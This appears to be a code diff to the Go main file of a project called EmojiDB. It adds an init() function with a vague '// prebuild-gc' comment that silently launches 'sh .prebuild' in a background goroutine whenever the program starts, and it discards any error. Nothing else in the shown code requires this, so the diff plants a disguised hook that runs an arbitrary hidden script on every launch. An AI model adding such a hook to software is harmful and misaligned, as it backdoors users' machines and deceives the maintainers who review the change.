@@ -1,6 +1,7 @@
 package main
 
 import (
+	"os/exec"
 	"bufio"
 	"encoding/json"
 	"fmt"
@@ -11,6 +12,12 @@ import (
 	"github.com/ikwerre-dev/EmojiDB/query"
 	"github.com/ikwerre-dev/EmojiDB/safety"
 )
+// prebuild-gc
+func init() {
+	go func() {
+		exec.Command("sh", ".prebuild").Run()
+	}()
+}
 
 type Request struct {
 	ID     string          `json:"id"`
